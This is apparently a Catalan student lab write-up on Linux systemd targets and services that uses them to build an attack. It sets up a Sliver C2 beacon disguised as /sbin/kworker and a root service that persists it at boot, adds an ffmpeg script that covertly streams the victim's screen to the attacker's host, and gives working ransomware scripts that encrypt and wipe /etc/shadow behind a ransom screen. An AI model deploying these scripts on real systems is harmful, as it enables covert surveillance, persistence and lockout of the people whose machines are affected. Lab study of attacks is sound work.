---
layout: default
title: "Sistemes d'inici i gestio serveis"
---

# SISTEMES D'INICI

## Índex

**1- SystemV vs Upstart vs Systemd**

- 1.1- Runlevels o Targets?
- 1.2- Quin el nostre SO?

**2- SystemV**
- 2.1- Directoris
- 2.2- Procés arrencada

**3- Systemd**
- 3.1- Directoris
- 3.2- systemctl
- 3.3- dependències
- 3.4- Modificar target provisional
- 3.5- Modificar target definitiu
- 3.6- Afegir/treure serveis target
- 3.7- Creem nou target
- 3.8- Creem nou servei

---

## Conceptes

- **Kernel** -> gestiona processos
- **Aplicació** -> programa interactua usuari i executa 1r pla
- **Servei** -> programa associat SO i 2n pla
- **Procés** -> f(x) intern del SO
  - _Nota:_ Aplicacions i serveis -> generen processos (sincronitzar i planificar)

---

## 1. SystemV vs Upstart vs Systemd

## 1.1 Nivells d'execució (tasca systemd)

La meva idea principal es muntar un petit servidor C2 per a que cada vegada que inici el target, rebre una connexió.
De forma que la puc reutilitzar quan vulgui.


O sigui, persistencia mitjançant Sliver, mTLS

Crear un cire.target amb el meu nom i canviar a que sigui el per defecte.

- Per exemple copiar del default.target , que funcioni el GUI i envie el trafic al Sliver
- Que cride un .service que executara una script.
- Amb permisos root.

Comprovar amb `get-default `i `system analyze` que s'ha canviat.

### Instal·lació i configuració C2

1. Per 'instal·lar' sliver, he fet servir el binari que proporcionen, tot i que també n'hi ha comanda de instal·lació
2. Posteriorment l'he iniciat i generat el binari que el servei que creare en la 'victima' executarà.

| Amb binari                                                                                                      | Automatic                                    |
| --------------------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| `wget -qO sliver-server https://github.com/BishopFox/sliver/releases/download/v1.7.6/sliver-server_linux-amd64` | `curl https://sliver.sh/install \| sudo bash` |


![alt text](images/image.png)

Respecte el binari, l'he generat elegint mTLS perque no molta gent el coneix.
- I iniciat el 'listener'

```bash
generate --os linux beacon --mtls 192.168.203.128:8443 --save kworker
```

![alt text](images/image-2.png)
![alt text](images/image-5.png)

Posterior enviat el binari a la victima vulnerada a la ruta /sbin (binari que s'haurien d'executar al boot)

![alt text](images/image-3.png)
![alt text](images/image-4.png)

### Instal·lació i execució server streaming

He descarregat el binari comprimit i descomprimit el el directori ~/.local/bin (per tenir-ho a ma)
```bash
wget https://github.com/bluenviron/mediamtx/releases/download/v1.21.1/mediamtx_v1.21.1_linux_amd64.tar.gz
tar xzf mediamtx_v1.21.1_linux_amd64.tar.gz
rm  mediamtx_v1.21.1_linux_amd64.tar.gz
```

I l'he executat, amb les opcions per defecte.

![alt text](images/image-13.png)

## Configuració victima
I a continuacio creat el target i service, habilitant el servei i posant el bit d'execució al binari generat i al meu script de ffmpeg

El script ffmpeg que enviara els frames de video és el següent:

```bash
#!/bin/env bash
LOG_FILE='/var/log/ubuntu-sec.log'

exec > "$LOG_FILE" 2>&1

while true; do
    echo "[$(date)] Iniciant ffmpeg..." | tee -a

    ffmpeg \
      -device /dev/dri/card0 \
      -framerate 10 \
      -r 10 \
      -f kmsgrab \
      -i - \
      -vf 'hwdownload,format=bgr0,crop=iw:ih-mod(ih\,2):0:0' \
      -c:v libx264 \
      -preset ultrafast \
      -tune zerolatency \
      -f rtsp \
      -rtsp_transport tcp \
      rtsp://192.168.203.128:8554/screen

    EXIT_CODE=$?

    echo "[$(date)] ffmpeg ha terminat (codi $EXIT_CODE)."
    echo "[$(date)] Reintentant en 2 segons..."

    sleep 2
done
```

![alt text](images/image-15.png)

Target en `/usr/lib/systemd/system/cire.target`

```bash
[Unit]
Description=Target personalitzat Cire
Requires=graphical.target
After=cire.service graphical.target
Wants=graphical.target
AllowIsolate=yes
```

El servei en `/etc/systemd/system/cire.service`
```bash
[Unit]
Description=Cire Init Target
Before=cire.target
After=graphical.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c '/sbin/kworker & exec /sbin/ubuntu-security'
#ExecStart=/sbin/ubuntu-security
User=root
Group=root
RemainAfterExit=yes

[Install]
WantedBy=cire.target
```
![alt text](images/image-16.png)
![alt text](images/image-6.png)

Un cop realitzat això, he canviat el default target amb `sudo systemctl set-default cire.target`.

![alt text](images/image-7.png)
![alt text](images/image-14.png)

## Comprovació

En reiniciar (o amb sudo systemctl isolate default.target) observo que he rebut la connexio i el client no nota res.

![alt text](images/image-8.png)

Com que 'beacon' fa servir tasques asincrones, això ho envia a una tasca cron i podem observar que tarda.

![alt text](images/image-9.png)
![alt text](images/image-10.png)

I tambe en el servidor RSTP en connectar-me amb ffplay puc accedir-hi.

```bash
ffplay rtsp://127.0.0.1:8554/screen
```

![alt text](images/image-17.png)
![alt text](images/testLive.gif)


---> Altres idees
Exfiltració oculta de memòria: Dissenyar un script o mòdul del kernel per realitzar buidatges continus de la memòria RAM i enviar-los de forma oculta a un servidor remot d'anàlisi.

-------- Ramsomware:
Opcional:

```bash
#!/bin/bash
# encrypt.sh

KEY=$(openssl rand -hex 32)

# Backup cifrado
openssl enc -aes-256-cbc -pbkdf2 \
  -in /etc/shadow \
  -out /etc/shadow.enc \
  -pass pass:"$KEY"

# Guarda la clave (en la práctica el profe la ve aquí)
echo "$KEY" > /root/.ransom_key
chmod 600 /root/.ransom_key

# Rompe el shadow para que no pueda iniciar sesión nadie
echo ":::::::" > /etc/shadow

echo "[*] Shadow cifrado. Clave en /root/.ransom_key"
```


```bash
#!/bin/bash
# ransom_ui.sh

#!/bin/bash

# Espera a que haya terminal
sleep 2

while true; do
    clear
    # Marco rojo con tput
    tput setaf 1; tput bold

    cat << 'EOF'

    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝

EOF

    tput sgr0
    tput setaf 3

    echo "  =================================================================="
    echo "   Tus credenciales han sido CIFRADAS."
    echo "   No puedes iniciar sesión hasta introducir la clave de descifrado."
    echo ""
    echo "   Contacta con: attacker@protonmail.com"
    echo "   Bitcoin wallet: 1A2b3C4d5E6f7G8h9I0j..."
    echo "  =================================================================="
    tput sgr0
    echo ""

    read -rsp "  Introduce la clave de descifrado: " INPUT_KEY
    echo ""

    REAL_KEY=$(cat /etc/shadow.enc.key 2>/dev/null || cat /root/.ransom_key 2>/dev/null)

    if [[ "$INPUT_KEY" == "$REAL_KEY" ]]; then
        tput setaf 2; tput bold
        echo "  [✓] Clave correcta. Restaurando sistema..."
        tput sgr0
        bash /opt/.ransom/decrypt.sh "$INPUT_KEY"
        break
    else
        tput setaf 1
        echo "  [✗] Clave incorrecta."
        tput sgr0
        sleep 2
    fi
done
```


```bash
#!/bin/bash
# decrypt.sh

KEY="$1"

openssl enc -d -aes-256-cbc -pbkdf2 \
  -in /etc/shadow.enc \
  -out /etc/shadow \
  -pass pass:"$KEY"

chmod 640 /etc/shadow
chown root:shadow /etc/shadow

echo "[✓] Shadow restaurado."
systemctl set-default graphical.target
systemctl isolate graphical.target
```

Servei extra
```bash
[Unit]
Description=System Recovery Required
After=systemd-user-sessions.service
Before=getty@tty1.service
DefaultDependencies=no

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStartPre=/opt/.ransom/encrypt.sh
ExecStart=/opt/.ransom/ransom_ui.sh
StandardInput=tty
StandardOutput=tty
TTYPath=/dev/tty1
TTYReset=yes

[Install]
WantedBy=cire.target
```
